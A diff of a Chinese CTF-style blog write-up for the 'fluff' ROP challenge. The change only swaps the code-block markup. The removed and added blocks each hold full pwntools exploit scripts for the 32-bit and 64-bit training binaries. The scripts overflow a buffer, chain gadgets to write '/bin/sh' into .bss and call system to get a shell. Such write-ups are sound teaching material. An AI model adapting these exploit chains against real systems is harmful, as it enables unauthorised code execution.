@@ -130,41 +130,7 @@ if (autoChangeMode === '1') {
 <p>&emsp;&emsp;最终实现控制写入的字符串，下面做一个草图帮助一下理解以及EXP的编写：</p>
 <p><img src= "/img/loading.gif" data-lazy-src="/img/fluff/fluff11.png"></p>
 <h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>&emsp;&emsp;最后就是EXP的编写：</p>
-<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">* from pwn import *
-* 
-* sh &#x3D; process(&#39;.&#x2F;fluff32&#39;)
-* elf &#x3D; ELF(&#39;.&#x2F;fluff32&#39;)
-* 
-* pop_ebx_addr &#x3D; 0x080483e1
-* xor_edx_edx_addr &#x3D; 0x08048671
-* xor_edx_ebx_addr &#x3D; 0x0804867b
-* xchg_addr &#x3D; 0x08048689
-* mov_addr &#x3D; 0x08048693
-* 
-* bss_addr &#x3D; 0x0804a040
-* sys_addr &#x3D; elf.symbols[&#39;system&#39;]
-* 
-* def mov_data(string, addr):
-*     payload &#x3D; p32(pop_ebx_addr) + p32(addr)
-*     payload +&#x3D; p32(xor_edx_edx_addr) + p32(0xdeadbeef)
-*     payload +&#x3D; p32(xor_edx_ebx_addr) + p32(0xdeadbeef)
-*     payload +&#x3D; p32(xchg_addr) + p32(0xdeadbeef)
-*     payload +&#x3D; p32(pop_ebx_addr) + string
-*     payload +&#x3D; p32(xor_edx_edx_addr) + p32(0xdeadbeef)
-*     payload +&#x3D; p32(xor_edx_ebx_addr) + p32(0xdeadbeef)
-*     payload +&#x3D; p32(mov_addr) + p32(0xdeadbeef) + p32(0)
-*     return payload
-* 
-* payload &#x3D; &#39;a&#39; * (0x28 + 0x4)
-* payload +&#x3D; mov_data(&#39;&#x2F;bin&#39;, bss_addr)
-* payload +&#x3D; mov_data(&#39;&#x2F;sh\x00&#39;, bss_addr + 4)
-* payload +&#x3D; p32(sys_addr) + p32(0xdeadbeef) + p32(bss_addr)
-* 
-* sh.recvuntil(&#39;&gt;&#39;)
-* sh.sendline(payload)
-* 
-* sh.interactive()
-* sh.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./fluff32&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./fluff32&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* pop_ebx_addr = <span class="number">0x080483e1</span></span><br><span class="line">* xor_edx_edx_addr = <span class="number">0x08048671</span></span><br><span class="line">* xor_edx_ebx_addr = <span class="number">0x0804867b</span></span><br><span class="line">* xchg_addr = <span class="number">0x08048689</span></span><br><span class="line">* mov_addr = <span class="number">0x08048693</span></span><br><span class="line">* </span><br><span class="line">* bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">* sys_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* <span class="function"><span class="keyword">def</span> <span class="title">mov_data</span>(<span class="params">string, addr</span>):</span></span><br><span class="line">*     payload = p32(pop_ebx_addr) + p32(addr)</span><br><span class="line">*     payload += p32(xor_edx_edx_addr) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">*     payload += p32(xor_edx_ebx_addr) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">*     payload += p32(xchg_addr) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">*     payload += p32(pop_ebx_addr) + string</span><br><span class="line">*     payload += p32(xor_edx_edx_addr) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">*     payload += p32(xor_edx_ebx_addr) + p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">*     payload += p32(mov_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0</span>)</span><br><span class="line">*     <span class="keyword">return</span> payload</span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">0x4</span>)</span><br><span class="line">* payload += mov_data(<span class="string">&#x27;/bin&#x27;</span>, bss_addr)</span><br><span class="line">* payload += mov_data(<span class="string">&#x27;/sh\x00&#x27;</span>, bss_addr + <span class="number">4</span>)</span><br><span class="line">* payload += p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;EXP运行结果：</p>
 <p><img src= "/img/loading.gif" data-lazy-src="/img/fluff/fluff12.png"></p>
@@ -175,42 +141,7 @@ if (autoChangeMode === '1') {
 <p>&emsp;&emsp;以及调用system函数传参的时候需要控制rdi寄存器：</p>
 <p><img src= "/img/loading.gif" data-lazy-src="/img/fluff/fluff15.png"></p>
 <p>&emsp;&emsp;万事俱备，直接给出EXP脚本：</p>
-<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">* from pwn import *
-* 
-* sh &#x3D; process(&#39;.&#x2F;fluff&#39;)
-* elf &#x3D; ELF(&#39;.&#x2F;fluff&#39;)
-* 
-* bss_addr &#x3D; 0x601060
-* sys_addr &#x3D; elf.symbols[&#39;system&#39;]
-* 
-* mov_addr &#x3D; 0x40084e
-* xchg_addr &#x3D; 0x400840
-* xor_r11_r12_addr &#x3D; 0x40082f
-* xor_r11_r11_addr &#x3D; 0x400822
-* pop_addr &#x3D; 0x4008bc
-* 
-* pop_rdi_addr &#x3D; 0x4008c3
-* 
-* payload &#x3D; &#39;a&#39; * (0x20 + 0x8)
-* payload +&#x3D; p64(pop_addr) + p64(bss_addr) + p64(0) + p64(0) + p64(0)
-* payload +&#x3D; p64(xor_r11_r11_addr) + p64(0)
-* payload +&#x3D; p64(xor_r11_r12_addr) + p64(0)
-* payload +&#x3D; p64(xchg_addr) + p64(0)
-* 
-* payload +&#x3D; p64(pop_addr) + &#39;&#x2F;bin&#x2F;sh\x00&#39; + p64(0) + p64(0) + p64(0)
-* payload +&#x3D; p64(xor_r11_r11_addr) + p64(0)
-* payload +&#x3D; p64(xor_r11_r12_addr) + p64(0)
-* payload +&#x3D; p64(mov_addr) + p64(0) + p64(0)
-* 
-* payload +&#x3D; p64(pop_rdi_addr) + p64(bss_addr)
-* 
-* payload +&#x3D; p64(sys_addr)
-* 
-* sh.recvuntil(&#39;&gt;&#39;)
-* sh.sendline(payload)
-* 
-* sh.interactive()
-* sh.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./fluff&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* bss_addr = <span class="number">0x601060</span></span><br><span class="line">* sys_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">* </span><br><span class="line">* mov_addr = <span class="number">0x40084e</span></span><br><span class="line">* xchg_addr = <span class="number">0x400840</span></span><br><span class="line">* xor_r11_r12_addr = <span class="number">0x40082f</span></span><br><span class="line">* xor_r11_r11_addr = <span class="number">0x400822</span></span><br><span class="line">* pop_addr = <span class="number">0x4008bc</span></span><br><span class="line">* </span><br><span class="line">* pop_rdi_addr = <span class="number">0x4008c3</span></span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">* payload += p64(pop_addr) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(xor_r11_r11_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(xor_r11_r12_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(xchg_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* </span><br><span class="line">* payload += p64(pop_addr) + <span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(xor_r11_r11_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(xor_r11_r12_addr) + p64(<span class="number">0</span>)</span><br><span class="line">* payload += p64(mov_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">* </span><br><span class="line">* payload += p64(pop_rdi_addr) + p64(bss_addr)</span><br><span class="line">* </span><br><span class="line">* payload += p64(sys_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure>
 
 <p>&emsp;&emsp;EXP运行结果：</p>
 <p><img src= "/img/loading.gif" data-lazy-src="/img/fluff/fluff16.png"></p>
